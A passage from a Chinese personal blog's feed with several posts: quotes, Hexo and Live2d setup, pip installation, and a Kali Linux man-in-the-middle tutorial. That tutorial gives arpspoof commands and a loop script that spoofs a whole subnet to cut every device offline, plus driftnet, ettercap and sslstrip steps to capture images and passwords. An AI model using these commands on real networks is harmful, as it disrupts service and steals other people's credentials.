class="lozad"></p><blockquote><p><strong>你要学着无论遇到什么事情欣喜</strong></p><p><strong>悲伤或是濒临崩溃都能够不动声色</strong></p><p><strong>自己处理事情自己辨别对错</strong></p><p><strong>好好成长</strong></p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/feca0000691c08e97bb4" class="lozad"></p><blockquote><p><strong>敬往事个屁酒</strong></p><p><strong>该敬的是那个勇敢的自己</strong></p><p><strong>那个受到了所有失望和背叛后</strong></p><p><strong>依然踌躇满志 敢爱敢恨的自己</strong></p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/1001100001b72ad5b14ef" class="lozad"></p><blockquote><p><strong>走好自己的路，迈好自己的步，少理那些背后说三道四的废物。</strong></p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/ffab0000aa95f3f25f09" class="lozad"></p><blockquote><p><strong>终于相信，每一条走上来的路，都有它不得不那样跋涉的理由。每一条要走下去的路，都有它不得不那样选择的方向。</strong></p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/ff4f0000ab41cb1675bb" class="lozad"></p><blockquote><p><strong>要么没有，要么全部，要么现在，要么永不。从现在起，我将不再期待，只珍惜我所拥有的。</strong></p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/dc0d0004db6f65573f6d" class="lozad"></p><blockquote><p><strong>给自己一些时间，原谅做过很多傻事的自己。接受自己，爱自己；要相信，过去的都会过去，该来的都在路上。</strong></p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/fe4300008e2eefd98c03" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="生活" scheme="https://gz1903.github.io/categories/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="励志" scheme="https://gz1903.github.io/categories/%E7%94%9F%E6%B4%BB/%E5%8A%B1%E5%BF%97/"/>
    
    
      <category term="生活" scheme="https://gz1903.github.io/tags/%E7%94%9F%E6%B4%BB/"/>
    
      <category term="励志" scheme="https://gz1903.github.io/tags/%E5%8A%B1%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>Hexo添加Live2d看板动画效果</title>
    <link href="https://gz1903.github.io/2019/10/15/Hexo%E6%B7%BB%E5%8A%A0Live2d%E7%9C%8B%E6%9D%BF%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C/"/>
    <id>https://gz1903.github.io/2019/10/15/Hexo添加Live2d看板动画效果/</id>
    <published>2019-10-15T13:43:27.000Z</published>
    <updated>2019-10-28T03:42:50.408Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>Hexo是一个快速、简洁且高效的博客框架，能够快速生成静态页面，只需一条指令即可部署到 GitHub Pages, Heroku 或其他网站，支持 GitHub Flavored Markdown 的所有功能，同时还拥有强大的插件系统。</p><p><img alt data-src="https://p.pstatp.com/origin/fe4a0000a08fd0c13898" class="lozad"></p><p>为增添页面趣味性，这次主要介绍 <strong>Hexo</strong> 添加Live2d看板动画效果。</p><h1 id="添加Live2d看板动画"><a href="#添加Live2d看板动画" class="headerlink" title="添加Live2d看板动画"></a>添加Live2d看板动画</h1><p><strong><a href="https://github.com/xiazeyu/live2d-widget-models/commit/231c840a120e28ad74e7341f784dd08248caf059" target="_blank" rel="noopener">看板动画</a></strong></p><p>站点根目录下载插件，安装成功后，你可以在你的站点根文件夹<code>/node_modules/</code>底下找到<code>live2d-widget</code>这个文件夹。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure><p>安装你想要的live2d动画人物，这里选择 <code>live2d-widget-model-koharu</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install live2d-widget-model-koharu</span><br></pre></td></tr></table></figure><p>在站点根目录下<code>_config.yml</code>添加如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#live2d看板动画</span><br><span class="line">live2d:</span><br><span class="line">  enable: true</span><br><span class="line">  scriptFrom: local</span><br><span class="line">  pluginRootPath: live2dw/</span><br><span class="line">  pluginJsPath: lib/</span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  tagMode: false</span><br><span class="line">  log: false</span><br><span class="line">  model:</span><br><span class="line">    use: live2d-widget-model-koharu</span><br><span class="line">  display:</span><br><span class="line">    superSample: 2</span><br><span class="line">    width: 150</span><br><span class="line">    height: 300</span><br><span class="line">    position: right</span><br><span class="line">    hOffset: 100</span><br><span class="line">    vOffset: -50</span><br><span class="line">  mobile:</span><br><span class="line">    show: true </span><br><span class="line">    scale: 0.5</span><br><span class="line">react:</span><br><span class="line">    opacityDefault: 0.7</span><br><span class="line">    opacityOnHover: 0.2</span><br></pre></td></tr></table></figure><h1 id="本地预览效果"><a href="#本地预览效果" class="headerlink" title="本地预览效果"></a>本地预览效果</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure><h1 id="Live2d各个模型："><a href="#Live2d各个模型：" class="headerlink" title="Live2d各个模型："></a>Live2d各个模型：</h1><h3 id="live2d-widget-model-chitose"><a href="#live2d-widget-model-chitose" class="headerlink" title="live2d-widget-model-chitose"></a>live2d-widget-model-chitose</h3><p><img alt data-src="https://p.pstatp.com/origin/fe4a0000a08d891a1549" class="lozad"></p><h3 id="live2d-widget-model-epsilon2-1"><a href="#live2d-widget-model-epsilon2-1" class="headerlink" title="live2d-widget-model-epsilon2_1"></a>live2d-widget-model-epsilon2_1</h3><p><img alt data-src="https://p.pstatp.com/origin/fed40000cc5a743e5149" class="lozad"></p><h3 id="live2d-widget-model-haru-01"><a href="#live2d-widget-model-haru-01" class="headerlink" title="live2d-widget-model-haru_01"></a>live2d-widget-model-haru_01</h3><p><img alt data-src="https://p.pstatp.com/origin/ff710000a431bce325bb" class="lozad"></p><h3 id="live2d-widget-model-haru-02"><a href="#live2d-widget-model-haru-02" class="headerlink" title="live2d-widget-model-haru_02"></a>live2d-widget-model-haru_02</h3><p><img alt data-src="https://p.pstatp.com/origin/ffd400009132cc544f22" class="lozad"></p><h3 id="live2d-widget-model-haruto"><a href="#live2d-widget-model-haruto" class="headerlink" title="live2d-widget-model-haruto"></a>live2d-widget-model-haruto</h3><p><img alt data-src="https://p.pstatp.com/origin/ff7c00005b37bf013a3c" class="lozad"></p><h3 id="live2d-widget-model-koharu"><a href="#live2d-widget-model-koharu" class="headerlink" title="live2d-widget-model-koharu"></a>live2d-widget-model-koharu</h3><p><img alt data-src="https://p.pstatp.com/origin/ffaf00008314d58db851" class="lozad"></p><h3 id="live2d-widget-model-hibiki"><a href="#live2d-widget-model-hibiki" class="headerlink" title="live2d-widget-model-hibiki"></a>live2d-widget-model-hibiki</h3><p><img alt data-src="https://p.pstatp.com/origin/ff3000005d80a386f62a" class="lozad"></p><h3 id="live2d-widget-model-miku"><a href="#live2d-widget-model-miku" class="headerlink" title="live2d-widget-model-miku"></a>live2d-widget-model-miku</h3><p><img alt data-src="https://p.pstatp.com/origin/ff3d000080e58996f61a" class="lozad"></p><h3 id="live2d-widget-model-hijiki"><a href="#live2d-widget-model-hijiki" class="headerlink" title="live2d-widget-model-hijiki"></a>live2d-widget-model-hijiki</h3><p><img alt data-src="https://p.pstatp.com/origin/fe73000080c3e97be163" class="lozad"></p><h3 id="live2d-widget-model-tororo"><a href="#live2d-widget-model-tororo" class="headerlink" title="live2d-widget-model-tororo"></a>live2d-widget-model-tororo</h3><p><img alt data-src="https://p.pstatp.com/origin/fff700008b02b33ba68f" class="lozad"></p><h3 id="live2d-widget-model-izumi"><a href="#live2d-widget-model-izumi" class="headerlink" title="live2d-widget-model-izumi"></a>live2d-widget-model-izumi</h3><p><img alt data-src="https://p.pstatp.com/origin/fe9500010f2eb3e81fce" class="lozad"></p><h3 id="live2d-widget-model-nico"><a href="#live2d-widget-model-nico" class="headerlink" title="live2d-widget-model-nico"></a>live2d-widget-model-nico</h3><p><img alt data-src="https://p.pstatp.com/origin/ff4300012a0d2fd26fe0" class="lozad"></p><h3 id="live2d-widget-model-nietzsche"><a href="#live2d-widget-model-nietzsche" class="headerlink" title="live2d-widget-model-nietzsche"></a>live2d-widget-model-nietzsche</h3><p><img alt data-src="https://p.pstatp.com/origin/dc0e0003fe591e30be22" class="lozad"></p><h3 id="live2d-widget-model-ni-j"><a href="#live2d-widget-model-ni-j" class="headerlink" title="live2d-widget-model-ni-j"></a>live2d-widget-model-ni-j</h3><p><img alt data-src="https://p.pstatp.com/origin/ff2a00009569ea4124da" class="lozad"></p><h3 id="live2d-widget-model-nipsilon"><a href="#live2d-widget-model-nipsilon" class="headerlink" title="live2d-widget-model-nipsilon"></a>live2d-widget-model-nipsilon</h3><p><img alt data-src="https://p.pstatp.com/origin/ff9100008f839fa2b69f" class="lozad"></p><h3 id="live2d-widget-model-nito"><a href="#live2d-widget-model-nito" class="headerlink" title="live2d-widget-model-nito"></a>live2d-widget-model-nito</h3><p><img alt data-src="https://p.pstatp.com/origin/ff920000e23707f31859" class="lozad"></p><h3 id="live2d-widget-model-shizuku"><a href="#live2d-widget-model-shizuku" class="headerlink" title="live2d-widget-model-shizuku"></a>live2d-widget-model-shizuku</h3><p><img alt data-src="https://p.pstatp.com/origin/ff2000007cf8512db0cb" class="lozad"></p><h3 id="live2d-widget-model-tsumiki"><a href="#live2d-widget-model-tsumiki" class="headerlink" title="live2d-widget-model-tsumiki"></a>live2d-widget-model-tsumiki</h3><p><img alt data-src="https://p.pstatp.com/origin/fffb00003b22de60ed66" class="lozad"></p><h3 id="live2d-widget-model-unitychan"><a href="#live2d-widget-model-unitychan" class="headerlink" title="live2d-widget-model-unitychan"></a>live2d-widget-model-unitychan</h3><p><img alt data-src="https://p.pstatp.com/origin/dc10000289606c5ec97d" class="lozad"></p><h3 id="live2d-widget-model-gf"><a href="#live2d-widget-model-gf" class="headerlink" title="live2d-widget-model-gf"></a>live2d-widget-model-gf</h3><p><img alt data-src="https://p.pstatp.com/origin/10000000039a141fd6695" class="lozad"></p><h3 id="live2d-widget-model-wanko"><a href="#live2d-widget-model-wanko" class="headerlink" title="live2d-widget-model-wanko"></a>live2d-widget-model-wanko</h3><p><img alt data-src="https://p.pstatp.com/origin/fead00009151e943e78c" class="lozad"></p><h3 id="live2d-widget-model-z16"><a href="#live2d-widget-model-z16" class="headerlink" title="live2d-widget-model-z16"></a>live2d-widget-model-z16</h3><p><img alt data-src="https://p.pstatp.com/origin/fe3200011fc5d922916c" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Hexo" scheme="https://gz1903.github.io/categories/Hexo/"/>
    
      <category term="教程" scheme="https://gz1903.github.io/categories/Hexo/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="Hexo" scheme="https://gz1903.github.io/tags/Hexo/"/>
    
      <category term="教程" scheme="https://gz1903.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Linux下pip的安装</title>
    <link href="https://gz1903.github.io/2019/10/15/Linux%E4%B8%8Bpip%E7%9A%84%E5%AE%89%E8%A3%85/"/>
    <id>https://gz1903.github.io/2019/10/15/Linux下pip的安装/</id>
    <published>2019-10-15T09:43:30.000Z</published>
    <updated>2019-10-28T03:42:50.314Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="安装wget："><a href="#安装wget：" class="headerlink" title="安装wget："></a>安装wget：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install wget</span><br></pre></td></tr></table></figure><h1 id="安装pip："><a href="#安装pip：" class="headerlink" title="安装pip："></a>安装pip：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br><span class="line"></span><br><span class="line">python get-pip.py</span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/ff87000075deea18a108" class="lozad"></p><h1 id="查看pip版本"><a href="#查看pip版本" class="headerlink" title="查看pip版本"></a>查看pip版本</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip  -V</span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/fe470000da47755376c2" class="lozad"></p><p><strong>如果出现错误</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/usr/bin/pip&quot;, line 7, in &lt;module&gt;</span><br><span class="line">    from pip._internal import main</span><br><span class="line">ModuleNotFoundError: No module named &apos;pip._internal&apos;</span><br></pre></td></tr></table></figure><p><strong>因为这个错误导致 pip找不到</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python -m ensurepip</span><br><span class="line"></span><br><span class="line">python -m pip install --upgrade pip</span><br><span class="line"></span><br><span class="line">pip  -V</span><br></pre></td></tr></table></figure><h1 id="pip3"><a href="#pip3" class="headerlink" title="pip3"></a>pip3</h1><p><a href="https://www.gz1903.club/2019/10/08/Linux-%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85Python3/" target="_blank" rel="noopener">安装python3</a>的时候会自动安装pip3</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Linux" scheme="https://gz1903.github.io/categories/Linux/"/>
    
      <category term="Python" scheme="https://gz1903.github.io/categories/Linux/Python/"/>
    
      <category term="pip" scheme="https://gz1903.github.io/categories/Linux/Python/pip/"/>
    
    
      <category term="Linux" scheme="https://gz1903.github.io/tags/Linux/"/>
    
      <category term="Python" scheme="https://gz1903.github.io/tags/Python/"/>
    
      <category term="pip" scheme="https://gz1903.github.io/tags/pip/"/>
    
  </entry>
  
  <entry>
    <title>kali linux--中间人攻击</title>
    <link href="https://gz1903.github.io/2019/10/13/kali-linux-%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    <id>https://gz1903.github.io/2019/10/13/kali-linux-中间人攻击/</id>
    <published>2019-10-13T06:15:38.000Z</published>
    <updated>2019-10-28T03:42:51.779Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="ARP协议"><a href="#ARP协议" class="headerlink" title="ARP协议"></a>ARP协议</h2><p>ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。</p><h2 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h2><p>通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的进行。</p><h3 id="ARP攻击的局限性"><a href="#ARP攻击的局限性" class="headerlink" title="ARP攻击的局限性"></a>ARP攻击的局限性</h3><p>ARP攻击仅能在以太网（局域网如：机房、内网、公司网络等）进行。 </p><p>无法对外网（互联网、非本区域内的局域网）进行攻击。</p><h3 id="ARP攻击的攻击原理"><a href="#ARP攻击的攻击原理" class="headerlink" title="ARP攻击的攻击原理"></a>ARP攻击的攻击原理</h3><p>ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="环境：kali-linux"><a href="#环境：kali-linux" class="headerlink" title="环境：kali-linux"></a>环境：kali-linux</h3><h3 id="工具：arpspoof"><a href="#工具：arpspoof" class="headerlink" title="工具：arpspoof"></a>工具：arpspoof</h3><h4 id="获取自己的网卡，IP，网关信息。"><a href="#获取自己的网卡，IP，网关信息。" class="headerlink" title="获取自己的网卡，IP，网关信息。"></a>获取自己的网卡，IP，网关信息。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/ff3b00005cae4290e2ca" class="lozad"></p><h4 id="获取目标ip与网关信息。"><a href="#获取目标ip与网关信息。" class="headerlink" title="获取目标ip与网关信息。"></a>获取目标ip与网关信息。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 10.3.138.1/24</span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/ffe2000076a7ddfa9f0f" class="lozad"></p><h2 id="断网攻击"><a href="#断网攻击" class="headerlink" title="断网攻击"></a>断网攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.8.100 192.168.8.8</span><br></pre></td></tr></table></figure><p>双向攻击（即欺骗靶机也欺骗路由器）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.8.8 192.168.8.100</span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/10001000021821e51122f" class="lozad"></p><blockquote><p>攻击完成，此时被攻击手机无法上网。（ctrl+Z）（ctrl+C）可停止攻击</p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/ff3800005a18018f4849" class="lozad"></p><h2 id="群体攻击"><a href="#群体攻击" class="headerlink" title="群体攻击"></a>群体攻击</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim arp.sh</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/bash</span><br><span class="line">#</span><br><span class="line">#Date:2019.09.28</span><br><span class="line">#Author:GZ</span><br><span class="line">#Mail:GZ1903@126.com</span><br><span class="line"></span><br><span class="line">echo 0 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">for i in ` seq 2 254 `</span><br><span class="line">do</span><br><span class="line">nohup arpspoof -i eth0 -t 192.168.8.$i 192.168.8.1 &amp;</span><br><span class="line">nohup arpspoof -i eth0 -t 192.168.8.1 192.168.8.$i &amp;</span><br><span class="line">done</span><br></pre></td></tr></table></figure><blockquote><p>该群体攻击会造成局域网ip与mac地址混乱，任何设备（vnc,ssh,摄像头等联网设备）都不能与外界联网，且市场安全软件与策略不可防御，唯独渗透的kali能正常使用。慎用！！！</p></blockquote><h2 id="数据抓取"><a href="#数据抓取" class="headerlink" title="数据抓取"></a>数据抓取</h2><blockquote><p>首先要开始IP转发功能，linux因为系统安全考虑，是不支持IP转发的，其配置文件写在/proc/sys/net/ipv4的ip_forward中。默认为0，接下来修改为1。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 1 &gt;/proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure><p>修改完成后不显示，但可以用 <code>cat /proc/sys/net/ipv4/ip_forward</code>来确实是否修改成功。</p><p><img alt data-src="https://p.pstatp.com/origin/ffe6000090cded42ce48" class="lozad"></p><h4 id="抓取使用http协议的网页的图片"><a href="#抓取使用http协议的网页的图片" class="headerlink" title="抓取使用http协议的网页的图片"></a>抓取使用http协议的网页的图片</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i eth0</span><br></pre></td></tr></table></figure><blockquote><p>弹出对话框！！ eth0为监控网卡</p></blockquote><p><img alt data-src="https://p.pstatp.com/origin/fe3c0000c4a5a55f4852" class="lozad"></p><h4 id="http账户密码获取"><a href="#http账户密码获取" class="headerlink" title="http账户密码获取"></a>http账户密码获取</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tp -i eth0</span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/fe630000d607f86aa21c" class="lozad"></p><h4 id="https账户密码获取"><a href="#https账户密码获取" class="headerlink" title="https账户密码获取"></a>https账户密码获取</h4><blockquote><p> 使https链接还原为http s </p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sslstrip -a -f -k sslstrip</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="Kali" scheme="https://gz1903.github.io/categories/Kali/"/>
    
      <category term="渗透" scheme="https://gz1903.github.io/categories/Kali/%E6%B8%97%E9%80%8F/"/>
    
      <category term="Linux" scheme="https://gz1903.github.io/categories/Kali/%E6%B8%97%E9%80%8F/Linux/"/>
    
    
      <category term="Kali" scheme="https://gz1903.github.io/tags/Kali/"/>
    
      <category term="Linux" scheme="https://gz1903.github.io/tags/Linux/"/>
    
      <category term="渗透" scheme="https://gz1903.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Hexo——轻量、简易的博客</title>
    <link href="https://gz1903.github.io/2019/10/12/hexo%E2%80%94%E2%80%94%E8%BD%BB%E9%87%8F%E3%80%81%E7%AE%80%E6%98%93%E7%9A%84%E5%8D%9A%E5%AE%A2/"/>
    <id>https://gz1903.github.io/2019/10/12/hexo——轻量、简易的博客/</id>
    <published>2019-10-12T06:40:46.000Z</published>
    <updated>2019-10-28T03:42:51.397Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1 id="hexo介绍"><a href="#hexo介绍" class="headerlink" title="hexo介绍"></a>hexo介绍</h1><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="http://daringfireball.net/projects/markdown/" target="_blank" rel="noopener">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><h1 id="hexo环境搭建"><a href="#hexo环境搭建" class="headerlink" title="hexo环境搭建"></a>hexo环境搭建</h1><p>安装 Hexo 相当简单，只需要先安装下列应用程序即可：</p><ul><li><a href="http://nodejs.org/" target="_blank" rel="noopener">Node.js</a> (Node.js 版本需不低于 8.6，建议使用 Node.js 10.0 及以上版本)</li><li><a href="http://git-scm.com/" target="_blank" rel="noopener">Git</a></li></ul><h2 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h2><ul><li>Windows：下载并安装 <a href="https://git-scm.com/download/win" target="_blank" rel="noopener">git</a>.</li><li>Mac：使用 <a href="http://mxcl.github.com/homebrew/" target="_blank" rel="noopener">Homebrew</a>, <a href="http://www.macports.org/" target="_blank" rel="noopener">MacPorts</a> ：<code>brew install git</code>;或下载 <a href="http://sourceforge.net/projects/git-osx-installer/" target="_blank" rel="noopener">安装程序</a> 安装。</li><li>Linux (Ubuntu, Debian)：<code>sudo apt-get install git-core</code></li><li>Linux (Fedora, Red Hat, CentOS)：<code>sudo yum install git-core</code></li></ul><h2 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h2><p>安装 Node.js 的最佳方式是使用 <a href="https://github.com/nvm-sh/nvm" target="_blank" rel="noopener">nvm</a>。nvm 的开发者提供了一个自动安装 nvm 的简单脚本：</p><h4 id="cURL"><a href="#cURL" class="headerlink" title="cURL:"></a>cURL:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | sh</span><br></pre></td></tr></table></figure><h4 id="Wget"><a href="#Wget" class="headerlink" title="Wget:"></a>Wget:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.34.0/install.sh | sh</span><br></pre></td></tr></table></figure><p>安装完成后，重启终端并执行下列命令即可安装 Node.js。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm install node</span><br></pre></td></tr></table></figure><p>安装git：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y install git</span><br></pre></td></tr></table></figure><h2 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h2><p>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure><h1 id="建站"><a href="#建站" class="headerlink" title="建站"></a>建站</h1><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo init Blog </span><br><span class="line">cd Blog</span><br><span class="line">npm install</span><br><span class="line">hexo g</span><br></pre></td></tr></table></figure><p>本地访问：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p><img alt data-src="https://p.pstatp.com/origin/fe700000dcd2bfafea6c" class="lozad"></p><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.├── _config.yml</span><br><span class="line"> ├── package.json</span><br><span class="line"> ├── scaffolds</span><br><span class="line"> ├── source|</span><br><span class="line"> ├── _drafts|</span><br><span class="line"> └── _posts</span><br><span class="line"> └── themes</span><br></pre></td></tr></table></figure><table><thead><tr><th>文件/文件夹</th><th>说明</th></tr></thead><tbody><tr><td>_config.yml</td><td>配置文件</td></tr><tr><td>public</td><td>生成的静态文件，这个目录最终会发布到服务器</td></tr><tr><td>scaffolds</td><td>一些通用的markdown模板</td></tr><tr><td>source</td><td>编写的markdown文件，_drafts草稿文件，_posts发布的文章</td></tr><tr><td>themes</td><td>主题文件夹。Hexo 会根据主题来生成静态页面。</td></tr></tbody></table><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><h4 id="编写Blog"><a href="#编写Blog" class="headerlink" 